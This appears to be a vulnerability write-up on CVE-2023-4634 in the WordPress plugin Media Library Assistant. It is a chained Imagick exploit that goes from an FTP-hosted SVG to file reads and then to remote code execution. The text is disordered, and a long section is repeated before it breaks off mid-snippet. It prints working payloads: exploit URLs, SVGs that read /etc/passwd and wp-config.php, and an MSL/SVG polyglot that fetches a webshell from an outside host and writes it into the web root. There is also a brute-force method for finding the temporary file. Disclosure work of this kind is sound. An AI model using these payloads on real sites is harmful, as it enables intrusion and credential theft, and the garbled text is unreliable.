3. The file created use a random name and could not be bruteforced or guessed.

The first problem had been quickly solved using a polyglot SVG/MSL with <https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html> technics.

Then, we were able to trigger the creation of a file in the /tmp/ folder that is valid SVG but also that will be understood ad MSL using the good formatter. Example of polyglot valid file (we will deal with SVG part later).

```
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="http://X.X.X.X:8081/virus.webp" />
  <resize geometry="400x400" />
  <write filename="/var/www/html/exploit.php" />
  <get width="base-width" height="base-height" />
    <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
        <image xlink:href= text:/etc/passwd height="100" width="100"/>
</svg>
</image>
```

The order of tags is important, the XML declaration needs to be at the beginning to allow the identity function to return SVG. The `image` tags just after and then, the SVG part needs to be inside the image tags, or it will not work.

Then, our file is both understood by msl and svg parser:

```
root@141e013356ca:/var/www/html# ls exploit.php
ls: cannot access 'exploit.php': No such file or directory
root@141e013356ca:/var/www/html# convert poly.svg test.webp
root@141e013356ca:/var/www/html# ls exploit.php
ls: cannot access 'exploit.php': No such file or directory
root@141e013356ca:/var/www/html# convert msl:poly.svg test.webp
Aborted
root@141e013356ca:/var/www/html# ls exploit.php -lah
-rw-r--r-- 1 root root 14K Aug 28 16:17 exploit.php
```

The second problem of the file to be deleted after conversion could be resolved in multiple way:

* Generate a very large SVG file that will take long time to be generated, but with high risk of crashing the process and potentially the server, so we did not choose this way
* Host a very fake large external image (>20Go) called by the SVG. Depending on the network latency, it could take a long time to download (you can host resources in a foreign and distant country to increase the latency), but same problem: dealing with large resource could also provoke unwanted behavior and potential crashes
* The last (and the best), use a non-routed IP. By default, Imagick and PHP have a high timeout (1min), letting you enough time to reach the file before its deletion. It could depend on the PHP configuration so you can use previous method in case the safer is not working.

Example of long SVG conversion:

```
<?xml version="1.0" encoding="UTF-8"?>
    <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="http://192.192.192.23:1664/neverExist.svg" height="100" width="100"/>
</svg>
```

```
root@141e013356ca:/var/www/html# time php -r '$test = new Imagick("long.svg");'
real    1m0.257s
user    0m0.058s
sys 0m0.114s
```

Then our final Polyglot file SVG file will look like this:

```
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="http://x.x.x.x:8081/virus.webp" />
  <resize geometry="400x400" />
  <write filename="/var/www/html/exploit.php" />
  <get width="base-width" height="base-height" />
    <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="http://192.192.192.23:1664/neverExist.svg" height="100" width="100"/>
</svg>
</image>
```

Now, we have our a polyglot SVG/MSL file dropped in /tmp folder for one minute. Last problem (but not least clearly) how to include it using our second SVG? In 1 minute, we cannot bruteforce the 32-char string name.

Here we discover the power of the VID format with this great article about exploitation of another Software using Imagick: <https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/>.

The VID is everything we hoped for, as explained in the article, the VID formatter is using `ExandFilenames()` function on input parameters, which allows usage of wildcard within a folder (<https://github.com/ImageMagick/ImageMagick/blob/main/MagickCore/utility.c#L748>)!

Playing just a little with the format, we quickly understood how powerful it was:

* It is enabled by default
* You can now include specific files without knowing the exact name, the format is quite flexible
* And most of all, in ImageMagick, all formatters could be chained!

You can now use vid formatter with multiple combination.

A double text: formatter to have full directory listing within a directory:
SVG File:

```
<svg width="1000" height="700"
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">
<image xlink:href="text:vid:text:/var/www/html/*.php"  width="500" />
</svg>
```

Nice !

Now you see where we are going, VID could also be chained with our dear MSL: `text:vid:msl:/tmp/magick-*`

The order is important, the text formatter needs always to be used in first in SVG xlink tags; then the VID allowing the Call of ExpandFileName then the MSL.

Now we are able to launch MSL parsing on all /tmp/magick-\* file ! the only issue?

If one of the files raise an error, the process will stop, and we will have a 500 Error.

And as you probably remember, we have our old messy 0bytes file that are never deleted within the /tmp folder. The ExpandFileName is sorting file names in alphabetical order, so if we have one 0byte file that has been generated with for instance a 0 or an A, we are doomed, the first file will always raise the error and other file will not be considered.

We must be then more specific.

We know reading the source code that each random filename in /tmp/magick is using 32 random chars selected from the following list:

```
static const char
    portable_filename[65] =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";
```

<https://github.com/ImageMagick/ImageMagick/blob/main/MagickCore/resource.c>

Then, we can only bruteforce the 65 chars as first characters, using 65 different SVG files, each of them containing a first letter to bruteforce: exploiter\_A.svg containing `text:vid:msl:/tmp/magick-A*`, exploiter\_B.svg containitng
`text:vid:msl:/tmp/magick-B*` ...

With that, we will, with a high level of confidence, find the so wanted SVG/MSL uploaded file without reaching a blank temporary file or another MVG file.

To increase our chances, lets launch the generation of hundred “long SVG” so that we will be sure one of the bruteforce will work (only one is needed) without any nasty 0byte file before that.

Even if the target has already many non-deleted /tmp/magick file, we will for sure, at one moment, find one that will work using that technic.

## Bomb this City and Everyone in It

Now we have all in our hand, we can set up the exploit and the bruteforcer.

All is explained and scripted here:
<https://github.com/Patrowl/CVE-2023-4634/>
The final path of the exploit is then:

* Launch x100 long SVG/MSL polyglot file conversion that will trigger creation of x100 SVG/MSL file in /tmp folder
* Use SVG with VID formatter using wildcard to bruteforce on of the 100 hundred SVG/MSL filename in /tmp folder with only 65 requests.
* Baboum

We also create a Nuclei template to detect the exploitability (not just the plugin version):
<https://github.com/Patrowl/CVE-2023-4634/blob/master/CVE-2023-4634.yaml>

## SVGs Means Trouble

This exploitation was for us quite interesting to perform, as it highlights the dangerousness of external libraries that could be used in WordPress Plugins. Not sure WordPress administrator has a clean view of the configuration of each external library used, especially of Imagick that came directly installed with a “basic” instance of Wordpress.

As explained in the article, the position of Imagemagick teams is clear and they are quite reactive on security subject. We warned them about the dangerousness of SVG Parsing, and default allowing of SVG, but their response was what we expected:

\*While it's possible to defend against certain vulnerabilities, such as the use of SVG's xlink, through a definition mechanism, it's not a robust security approach. For instance, xlink would remain inactive by default unless a specific definition is specified. Yet, this strategy proves inadequate as it's akin to a temporary solution, and we would be continuously reacting to emerging vulnerabilities until the next one emerges. The security policy was designed specifically to address potentially unknown exploits. If a new exploit is discovered, the user is protected by invoking the appropriate security policy. The result is immediate protection against the exploit without the need to update the binary distribution.

Security is a compromise between security and convenience. The open nature of ImageMagick allows any user to exploit all the features of the package in a secure environment such as Docker, yet the security policy allows an administrator to selectively lock out features per their local context in a more open environment such as a public web site. For any public web site, we recommend these coders: MSL, MSVG, MVG, PS, PDF, RSVG, SVG, XPS, be disabled in the security policy.

**To be clear**, if you are a WordPress administrator, you must reinforce your default security Imagick policies located in `/etc/ImageMagick-X/policy.xml`, to disallow MSL, MSVG, MVG, PS, PDF, RSVG, SVG, XPS (especially SVG not disable by default which is for us one of the dangerous one). Even if you think that your WordPress does not use this library.

Regarding the plugin itself, special thanks to David Lingren which has been quite reactive for the fix (3.10 version).

Finally, all Patrowl customers using this plugin were warned. The plugins have been disabled during the time of patching, and then re-enabled the plugin when 3.10 has been released with the correction. Some of them even restrict Imagick libraries to be sure.

As discussed in many of our articles, you already know that WordPress and related plugins are taking up a large space in the global attack surface we are monitoring for our customers.

Discovering always new methods and techniques to exploit potential flaws on these technologies allows us to be pro-active and try to maintain an advantage over potential attackers.

The vulnerability described below is a perfect example of that proactivity: we promptly alerted all our customers who were using the vulnerable plugins, even before the fix for the vulnerability became available (in most cases, our clients either disabled the plugin or implemented a custom fix provided by us).

## When You’re Lost in the Web

The first alert that raised our automatization was a confirmed Local File Inclusion (LFI) in a WordPress plugin called “Media Library Assistant” : <https://www.cvedetails.com/cve/CVE-2020-11732/>, the plugin has more than 70k active installation, not a bestseller but still interesting from an attacker perspective (to build a botnet, deploy ransomware...): <https://fr.wordpress.org/plugins/media-library-assistant/>

The plugin was indeed vulnerable regarding the version, but our automation was unable to go further (it has now been improved 😁).

In reality, Local File Inclusion vulnerabilities in WordPress are typically valuable for accessing critical files like `wp-config.php`. However, in the case of this specific vulnerability, it only works with an absolute path (as noted in the packetstorm exploit).

There is a file inclusion vulnerability in the mla-file-downloader.php file. Example:

```
http://server/wordpress/wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=text/html&mla_download_file=C:\Bitnami\wordpress-5.3.2-2\apps\wordpress\htdocs\wp-content\plugins\updraftplus\options.php
```

Patrowl automatization did not managed to identify a full path disclosure vulnerability elsewhere on the website, and all classic bruteforced path did not work.

This the moment chooses by our automatization to request a more in-depth investigation from a pentester.

The process is classic, and if you already read one of our articles, you likely familiar with the procedure: setting up a lab environment with the latest plugin version installed.
Originally, the plan was to identify in the plugin, a method that could trigger a full path disclosure and help the machine to go deeper in the exploitation. But we found a much more interesting and challenging vulnerability, bringing back old memories.

## Left Behind

The initial discovery (CVE-2020-11732) was targeting the `mla-file-downloader.php` file locate in the `includes` folder of the plugin directory.
A small stand-alone file now patched since a long time:

```
<?php
/**
 * Stand-alone file download handler for the [mla_gallery]
 *
 * @package Media Library Assistant
 * @since 2.32
 */

/*
 * Process [mla_gallery link=download] requests
 */
//@ini_set('error_log','C:\Program Files (x86)\Apache Software Foundation\Apache24\logs\php-errors.log');

require_once( pathinfo( __FILE__, PATHINFO_DIRNAME ) . '/class-mla-file-downloader.php' );

MLAFileDownloader::mla_process_download_file( array( 'error' => 'MLA File Downloader no longer supported because it allowed Local File Disclosure attacks.' ) );

// NO LONGER ALLOWED AS OF v2.82
if ( isset( $_REQUEST['mla_download_file'] ) && isset( $_REQUEST['mla_download_type'] ) ) {
    MLAFileDownloader::$mla_debug = isset( $_REQUEST['mla_debug'] ) && 'log' == $_REQUEST['mla_debug'];
    MLAFileDownloader::mla_process_download_file();
}

MLAFileDownloader::mla_die( 'MLA File Download parameters not set', __LINE__, 500 );
?>
```

The direct access to `mla-file-downloader.php` is now not allowed anymore. The first `require_once` is indeed now pointing to a file (class-mla-file-downloader.php) including the magic WordPress condition:

```
defined( 'ABSPATH' ) or die();
```

The condition disallows direct access to WordPress PHP files. So whatever we will do, the `die()` will systematically be called when reaching the `mla-file-downloader` directly. We had to look elsewhere.

The `Stand-alone` reference in the comment is quite interesting. Normally, stand-alone files are created to be reached directly, and with a little bit of luck, unauthenticated.

```
grep -ri "Stand-Alone" --include \*.php
./includes/mla-file-downloader.php: * Stand-alone file download handler for the [mla_gallery]
./includes/mla-stream-image.php: * Stand-alone stream image handler for the mla_viewer
./includes/class-mla-shortcode-support.php:                      * found by the stand-alone (no WordPress) image stream processor.
./examples/plugins/smart-media-categories/admin/includes/class-smc-automatic-support.php:               // Check for stand-alone terms update, i.e., not part of an insert/update post event
```

The second one seems juicy: `mla-stream-image.php`, let’s have a look.

## Infected

The file has the same structure as the first one and is very easy to understand:

```
<?php
/**
 * Stand-alone stream image handler for the mla_viewer
 *
 * @package Media Library Assistant
 * @since 2.10
 */

/*
 * Process mla_viewer image stream requests
 */
//@ini_set('error_log','C:\Program Files\Apache Software Foundation\Apache24\logs\php-errors.log');

require_once( pathinfo( __FILE__, PATHINFO_DIRNAME ) . '/class-mla-image-processor.php' );

if ( isset( $_REQUEST['mla_stream_file'] ) ) {
    MLAImageProcessor::$mla_debug = isset( $_REQUEST['mla_debug'] ) && 'log' == $_REQUEST['mla_debug'];
    MLAImageProcessor::mla_process_stream_image();
}

MLAImageProcessor::_mla_die( 'mla_stream_file not set', __LINE__, 500 );
?>
```

But this time, the `class-mla-image-processor.php` is not protected from direct access:

Which indicates that we could reach the function `MLAImageProcessor::mla_process_stream_image()` with an unauthenticated controlled parameter : `$_REQUEST['mla_stream_file']`

The `mla_process_stream_image` is aptly named; it is used to generate thumbnails for local PDF. The function then first check if the file exists locally:

```
$
file = isset( $_REQUEST['mla_stream_file'] ) ? $_REQUEST['mla_stream_file'] : ''; // phpcs:ignore
if ( ! is_file( $file ) ) {
self::_mla_die( 'File not found', __LINE__, 404 );
}
```

If the file exists, it is then passed to the `_ghostscript_convert` function.

Other parameters used for conversion are also within the user's control. But all of them are strongly typed to int or even rewrite, which does not give us a large flexibility in our exploitation path:

```
$use_mutex = isset( $_REQUEST['mla_single_thread'] );
$width = isset( $_REQUEST['mla_stream_width'] ) ? abs( (int) $_REQUEST['mla_stream_width'] ) : 0;
$height = isset( $_REQUEST['mla_stream_height'] ) ? abs( (int) $_REQUEST['mla_stream_height'] ) : 0;
$type = isset( $_REQUEST['mla_stream_type'] ) ? sanitize_text_field( wp_unslash( $_REQUEST['mla_stream_type'] ) ) : 'image/webp';
$quality = isset( $_REQUEST['mla_stream_quality'] ) ? abs( (int) $_REQUEST['mla_stream_quality'] ) : 0;
$frame = isset( $_REQUEST['mla_stream_frame'] ) ? abs( (int) $_REQUEST['mla_stream_frame'] ) : 0;
$resolution = isset( $_REQUEST['mla_stream_resolution'] ) ? abs( (int) $_REQUEST['mla_stream_resolution'] ) : 72;

$ghostscript_path = isset( $_REQUEST['mla_ghostscript_path'] ) ? $_REQUEST['mla_ghostscript_path'] : ''; // phpcs:ignore
if ( ! empty( $ghostscript_path ) ) {
        $ghostscript_path = @file_get_contents( dirname( __FILE__ ) . '/' . 'mla-ghostscript-path.txt' );

$result = self::_ghostscript_convert( $file, $frame, $resolution, $type, $ghostscript_path );
```

The \_ ghostscript\_convert function is a little bit complicated and we did not find any exploitation path from here. It basically searches for the ghostscript executable and execute the appropriate “gs” command line, but with appropriate protection:

```
$cmd = escapeshellarg( $ghostscript_path ) . ' -sDEVICE=%1$s -r%2$dx%2$d -dFirstPage=%3$d -dLastPage=%3$d -dFitPage -o %4$s %5$s 2>&1';
```

If it succeeded, we get then a webp file (type set by default and cannot be changed) of our controlled path.

If the ghostscript\_convert fail, a backup plan is used with Imagick() library:

```
$result = self::_ghostscript_convert( $file, $frame, $resolution, $type, $ghostscript_path );

if ( false === $result ) {
try {
self::$image->readImage( $file . '[' . $frame . ']' );
}
catch ( Exception $e ) {
self::$image->readImage( $file . '[0]' );
 }
```

So, from that, we managed to generate webp extract of PDF or image files located somewhere in the WordPress, ex:
and...

Alright, that's interesting but clearly unexploitable. It might enable us to potentially access specific PDFs stored outside the WordPress Web Directory, but this would require knowing the exact paths to those PDFs (whether absolute or relative), To make it work, you'd have to combine it with another exploit.

Every other format (PHP) will raise an error as the format is not understood either by ghostccript and Imagick. The conversion will then not work, here is an extract of logs when we try to convert a PHP file to webp.

```
wordpress-local-wordpress-1  | [Fri Aug 25 14:49:36.458816 2023] [php:notice] [pid 32] [client 172.19.0.1:58574] 297 _mla_die( 'Image load exception: no decode delegate for this image format `PHP' @ error/constitute.c/ReadImage/575', '537', '404' )
```

As we hate fake unexploitable CVE, and as we love to say in French at Patrowl, let’s “Faire des efforts” (*Make serious efforts*).

## Look for the Imagick

Clearly, since the beginning, our secret goal is to reach the `Imagick()` function with a controlled file. We all know since a long that a misconfigured Imagick library is a goldmine for attackers, and you can find numerous very interesting papers or write-up exploiting the library (see References).
But, to do so, we need to have the `is_file()` used at the beginning of the function to return `True`. The first scenario would be to have a file upload functionality on the WordPress (maybe another plugin), find the uploaded path and use the local controlled file to play with Imagick library.

But no sign of file upload functionality for our WordPress, we had to find another way.

Our immediate though has been to use https:// or http:// remote protocol on the `is_file()` function but with no luck. Looking the documentation, we have a great “tip” given by PHP: <https://www.php.net/manual/en/function.is-file.php>

`is_file` is then working with all wrapper supporting the `stat()` family of functionality. http:// and https://, indeed, do not support `stat()` functionality.

But hello kiddo:

Quick local check, putting an existing arbitrary file on an open FTP server:

```
root@141e013356ca:/var/www/html# php -r "echo(is_file('ftp://X.X.X.X.:2122/test_is_file.txt'));"
1
```

In our remote server:

```
[I 2023-08-25 15:19:23] X.X.X.X:52806-[anonymous] USER 'anonymous' logged in.
[I 2023-08-25 15:19:23] X.X.X.X:52806-[anonymous] CWD /root/test_ftp/test_is_file.txt 550 'Not a directory.'
[I 2023-08-25 15:19:23] X.X.X.X:52806-[anonymous] FTP session closed (disconnect).
```

Awesome!
Now we can use a remote file within the `ghostcript` or `Imagick()` function. The second one is of course much more interesting. Testing with a valid remote controlled FTP hosted image on the plugin gives us:

<http://127.0.0.1/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://X.X.X.X:2122/test_is_file.txt&mla_debug=log>

```
[I 2023-08-25 15:24:42] X.X.X.X.48:52847-[anonymous] FTP session closed (disconnect).
[I 2023-08-25 15:24:42] X.X.X.X:52849-[Patrowl] FTP session opened (connect)
[I 2023-08-25 15:24:42] X.X.X.X:52849-[anonymous] USER 'anonymous' logged in.
[I 2023-08-25 15:24:42] X.X.X.X:52849-[anonymous] RETR /root/test_ftp/test_is_file.txt[0] completed=1 bytes=0 seconds=0.0
[I 2023-08-25 15:24:42] X.X.X.X:52849-[anonymous] FTP session closed (disconnect).
```

Bingo, we have the connection from our Wordpress to our FTP. The file asked is `test_is_file.txt[0]`. This is good sign as the `[0]` typically indicates the frame to be converted by Imagick.

Quick look on the logs, we see that the `ghoscript` function will systematically fail when used with an ftp:// filename as input.

We then have what we were looking for: an external controlled image converted by the Imagick() library. We just have to setup 2 files on our ftp server:

* `malicious_file.webp` that could be empty, just to bypass the is\_file() check,
* `malicious_file.webp[0]` which will be converted by Imagick.

Let’s have some fun.

## Endure and Survive

Now, let’s play a little with Imagick library. First, to clarify our speech, Imagick is the PHP library of ImageMagick software. Exploitation path on both software and PHP library are globally the same as the PHP library will use exported C Function of the Software.

Our previous exploits and all existing technical exploitation papers all point to a common conclusion: ImageMagick is an excellent tool for image rendering, but it must be configured with rigorous security policies. Developers of Imagick have had to patch numerous CVEs across thousands of plugins, and they are now quite clear about their stance on vulnerabilities:

“Before you post a vulnerability, first determine if the vulnerability can be mitigated by the security policy. ImageMagick, by default, is open. Use the security policy to add constraints to meet the requirements of your local security governance. »

Now, this becomes intriguing for us. Why? Well, consider this: out of the 70,000 plugins installed, how many developers or system operators are aware that one of their plugins is utilizing Imagick (the PHP library for ImageMagick) with a default open security policy?

A basic installation of the plugins (with Imagick libraries installed on the server) came with this default security policy:

```
<policymap>
  <policy domain="resource" name="memory" value="256MiB"/>
  <policy domain="resource" name="map" value="512MiB"/>
  <policy domain="resource" name="width" value="16KP"/>
  <policy domain="resource" name="height" value="16KP"/>
  <policy domain="resource" name="area" value="128MP"/>
  <policy domain="resource" name="disk" value="1GiB"/>
  <policy domain="delegate" rights="none" pattern="URL" />
  <policy domain="delegate" rights="none" pattern="HTTPS" />
  <policy domain="delegate" rights="none" pattern="HTTP" />
  <policy domain="path" rights="none" pattern="@*"/>
  <policy domain="coder" rights="none" pattern="PS" />
  <policy domain="coder" rights="none" pattern="PS2" />
  <policy domain="coder" rights="none" pattern="PS3" />
  <policy domain="coder" rights="none" pattern="EPS" />
  <policy domain="coder" rights="none" pattern="PDF" />
  <policy domain="coder" rights="none" pattern="XPS" />
</policymap>
```

We can see that some “dangerous” formats are disabled by default like PS or XPS. We could think HTTPs and HTTP patterns are also not allowed by default, but the policy seems to be just here to force Curl internal usage and using http external resource on Imagick() conversion works like a charm with this config.

Now we know that on every instance with the plugins effectively working with a default Imagick configuration, we will be able to use external SVG. Why SVG? let's explore how ImageMagick functions a bit more.

## Please hold to my SVG

All ImageMagick exploits work basically the same. The idea is to force Imagick to use its own internal scripting format called MSL. The MSL format allows to move or create file within the file server.

We can for example, move a remote PHP webshell file within the WordPress directory, where virus.webp just a polyglot webp file with PHP in it.

```
<image>
  <read filename="http://x.x.x.x/8081/virus.webp" />
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="/var/www/html/exploit.php" />
</image>
```

But triggering Imagick MSL parsing is not that easy anymore. When using the PHP Imagick library on images, a first called is made to the `identity` function. Identify will read the image, search for Magic Byte or specific string within the file. The result of the function will then be used as Imagick Parser.

But since Imagetragick, parser will explicitly not recognize dangerous scripting file such as MSL, when you try to parse a MSL file, Imagick will either considered it as SVG or say the format is not recognized.

```
root@141e013356ca:/var/www/html# php -r '$test = new Imagick("/var/www/html/test.msl");'
Fatal error: Uncaught ImagickException: no decode delegate for this image format `' @ error/constitute.c/ReadImage/575 in Command line code:1
```

The only way to get MSL understood by Imagick is to specify the file format before the file using what we will call a `formatter`:

```
root@141e013356ca:/var/www/html# php -r '$test = new Imagick("msl:/var/www/html/test.msl");'
Aborded
```

In our exploit, the controlled path will failed the `is_file()` check if we force the `msl:` formatter within our filename, we have to find another way.
SVG came quickly to our minds. SVG is built to use external files and references. When the Imagick default SVG parser is used, the file is converted in MVG format (Magick Vector Graphics Metafiles). `image` tags with specific inner tags such as `xlink:href` or `path` are transformed into the MVG instruction:

```
image Over %g,%g %g,%g \"%s\"\n »
```

<https://github.com/ImageMagick/ImageMagick/blob/main/coders/svg.c>

From here:

```
if (LocaleCompare((const char *) name,"image") == 0)
        {
          (void) FormatLocaleFile(svg_info->file,
            "image Over %g,%g %g,%g \"%s\"\n",svg_info->bounds.x,
            svg_info->bounds.y,svg_info->bounds.width,svg_info->bounds.height,
            svg_info->url);
          (void) FormatLocaleFile(svg_info->file,"pop graphic-context\n");
          break;
        }
```

Then, the MVG parsing (<https://github.com/ImageMagick/ImageMagick/blob/main/coders/mvg.c-> /) wil finally call the `DrawImage()` function : <https://github.com/ImageMagick/ImageMagick/blob/main/MagickCore/draw.c#L4512>

Which will integrate the `image` MVG in our new image using the ImageMagick `compose` function:

```
if (LocaleCompare("image",keyword) == 0)
          {
            ssize_t
              compose;

            primitive_type=ImagePrimitive;
            (void) GetNextToken(q,&q,extent,token);
            compose=ParseCommandOption(MagickComposeOptions,MagickFalse,token);
            if (compose == -1)
              {
                status=MagickFalse;
                break;
              }
            graphic_context[n]->compose=(CompositeOperator) compose;
```

`Compose` is a specific command from ImageMagick, it allows to combine multiple images, the “Over” parameter used in the SVG parser is just one of the dozen options available for composite ImageMagick <https://imagemagick.org/Usage/compose/#over>

The usage of composite function is then crucial to understand the exploitation. As it used for overlaying or combining multiple images, the function needs to understand specific ImageMagick commands.

Example, if you want to Over a specific text on image you can simply use composite with `text:/path/to/text.txt` and Imagemagick will automatically Over the text on your first image.

```
$composite patrowl.webp text:./patrowl.txt patrowl_over.webp
```

Will add the text of patrowl.txt on the patrowl.webp image.

Now, with a simple SVG, we can control defined ImageMagick formatters, such as MSL, but also all other formatters enabled by default.

## When we are in Need

The first analyses quickly lead us to a smooth LFI. The plugin directly returns the output of Imagick convert function as an http response:

```
// Stream the image back to the requestor
        try {
            header( "Content-Type: $type" );
            echo self::$image->getImageBlob();
```

Then, by using a SVG with a `text:` formatter in it, we can create a blank image on which we will Over as a result the content of the file we want on the file server, we just need to adjust the width and heigh so that we can have something we can read:

Lfi.sfg[0] on remote FTP server:

```
<svg width="500" height="500"
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">
<image xlink:href= "text:/etc/passwd" width="500" height="500" />
</svg>
```

Exploitation:

```
http://127.0.0.1/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://X.X.X.X:2122/lfi.svg&mla_debug=log&mla_stream_height=500&mla_stream_width=600
```

Now, we have a nice LFI, from here we can reach and print all WordPress PHP file we want, as the plugin will always be installed in the same directory, the relative path will always be the same.

We just need to adjust the page we want by setting the `mla_stream_frame` to 1 (and don’t forget to have the related `lfi.svg\[1\]` on the remote FTP).

Lfi.svg[1]:

```
<svg width="500" height="500"
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">
<image xlink:href= "text:../../../../wp-config.php" width="500" height="500" />
</svg>
```

Great, now we can potentially takeover the WordPress (depending on the configuration). But we are so closed to an RCE, we cannot stop here.

## Long, Long Time

To achieve our RCE, we now need a MSL file on the fileserver. Indeed, the msl: formatter does not accept remote file (`msl://http://x.x.x.x` will never work).

The technic used by Synacktiv in their article is using PDF conversion with embed PostScript to write the MSL file within the /tmp folder. Unfortunately, it will not work here since this format are disabled by default on our instance.

After spending hours playing with different format and trying to find one that could create a MSL file within a controlled directory, we discovered during all our tests that hundreds of files have been created in our docker instance within the /tmp folder with the nomenclature: /tmp/magick-\*

Many of them were the MVG converted file from our SVG payloads, but also, the first SVG payload download from our FTP server.

The fact that some files are not deleted by the Imagick process within the /tmp folder still a mystery. We have few clues on self-calling SVG file that could cause segfault and the file not to be deleted: <https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-j96m-mjp6-99xr>

But not exploitable in our configuration as the file came from an external source, it cannot be self-calling.
Taking a closer look, we discovered that for each SVG converted, we have 3 files created in /tmp folder, all using magick-XXX nomenclature (where XXX is a 32-char random string):

* One 0byte file
* One file is the SVG we are converting
* One file is the MVG transition format from Imagick

Note that the location of the /tmp folder used by Imagick could be configured within the policy.xml file. But now that you have LFI, you can quickly spot it if it has been changed.

Then, once the conversion is finished, the 0byte files is not deleted (it will be annoying later you will see) but 2 others are.

Our exploitation idea is then to use 2 files:

* One that will trigger the copy of the file within the /tmp folder during the conversion with MSL scripts in it
* The other, a SVG file, that includes a xlink reference with a msl: forced formatter pointing to the first file created in the /tmp folder.

The idea is good (of course), but requires multiple bypass:

1. To trigger the creation of the temporary file in the /tmp folder, the initial file needs to be a valid format (MSL or Text is not a valid or recognized format).
2. The file is instantly deleted after each conversion
3. The file created use a random name and could not be bruteforced or guessed.

The first problem had been quickly solved using a polyglot SVG/MSL with <https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html> technics.

Then, we were able to trigger the creation of a file in the /tmp/ folder that is valid SVG but also that will be understood ad MSL using the good formatter. Example of polyglot valid file (we will deal with SVG part later).

```
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="http://X.X.X.X:8081/virus.webp" />
  <resize geometry="400x400" />
  <write filename="/var/www/html/exploit.php" />
  <get width="base-width" height="base-height" />
    <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
        <image xlink:href= text:/etc/passwd height="100" width="100"/>
</svg>
</image>
```

The order of tags is important, the XML declaration needs to be at the beginning to allow the identity function to return SVG. The `image` tags just after and then, the SVG part needs to be inside the image tags, or it will not work.

Then, our file is both understood by msl and svg parser:

```
root@141e013356ca:/var/www/html# ls exploit.php
ls: cannot access 'exploit.php': No such file or directory
root@141e013356ca:/var/www/html# convert poly.svg test.webp
root@141e013356ca:/var/www/html# ls exploit.php
ls: cannot access 'exploit.php': No such file or directory
root@141e013356ca:/var/www/html# convert msl:poly.svg test.webp
Aborted
root@141e013356ca:/var/www/html# ls exploit.php -lah
-rw-r--r-- 1 root root 14K Aug 28 16:17 exploit.php
```

The second problem of the file to be deleted after conversion could be resolved in multiple way:

* Generate a very large SVG file that will take long time to be generated, but with high risk of crashing the process and potentially the server, so we did not choose this way
* Host a very fake large external image (>20Go) called by the SVG. Depending on the network latency, it could take a long time to download (you can host resources in a foreign and distant country to increase the latency), but same problem: dealing with large resource could also provoke unwanted behavior and potential crashes
* The last (and the best), use a non-routed IP. By default, Imagick and PHP have a high timeout (1min), letting you enough time to reach the file before its deletion. It could depend on the PHP configuration so you can use previous method in case the safer is not working.

Example of long SVG conversion:

```
<?xml version="1.0" encoding="UTF-8"?>
    <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="http://192.192.192.23:1664/neverExist.svg" height="100" width="100"/>
</svg>
```

```
root@141e013356ca:/var/www/html# time php -r '$test = new Imagick("long.svg");'
real    1m0.257s
user    0m0.058s
sys 0m0.114s
```

Then our final Polyglot file SVG file will look like this:

```
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="http://x.x.x.x:8081/virus.webp" />
  <resize geometry="400x400" />
  <write filename="/var/www/html/exploit.php" />
  <get width="base-width" height="base-height" />
    <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="http://192.192.192.23:1664/neverExist.svg" height="100" width="100"/>
</svg>
</image>
```

Now, we have our a polyglot SVG/MSL file dropped in /tmp folder for one minute. Last problem (but not least clearly) how to include it using our second SVG? In 1 minute, we cannot bruteforce the 32-char string name.

Here we discover the power of the VID format with this great article about exploitation of another Software using Imagick: <https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/>.

The VID is everything we hoped for, as explained in the article, the VID formatter is using `ExandFilenames()` function on input parameters, which allows usage of wildcard within a folder (<https://github.com/ImageMagick/ImageMagick/blob/main/MagickCore/utility.c#L748>)!

Playing just a little with the format, we quickly understood how powerful it was:

* It is enabled by default
* You can now include specific files without knowing the exact name, the format is quite flexible
* And most of all, in ImageMagick, all formatters could be chained!

You can now use vid formatter with multiple combination.

A double text: formatter to have full directory listing within a directory:
SVG File:

```
<svg width="1000" height="700"
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">
<image xlink:href="text:vid:text:/var/www/html/*.php"  width="500" />
</svg>
```

Nice !

Now you see where we are going, VID could also be chained with our dear MSL: `text:vid:msl:/tmp/magick-*`

The order is important, the text formatter needs always to be used in first in SVG xlink tags; then the VID allowing the Call of ExpandFileName then the MSL.

Now we are able to launch MSL parsing on all /tmp/magick-\* file ! the only issue?

If one of the files raise an error, the process will stop, and we will have a 500 Error.

And as you probably remember, we have our old messy 0bytes file that are never deleted within the /tmp folder. The ExpandFileName is sorting file names in alphabetical order, so if we have one 0byte file that has been generated with for instance a 0 or an A, we are doomed, the first file will always raise the error and other file will not be considered.

We must be then more specific.

We know reading the source code that each random filename in /tmp/magick is using 32 random chars selected from the following list:

```
static const char
    portable_filename[65] =
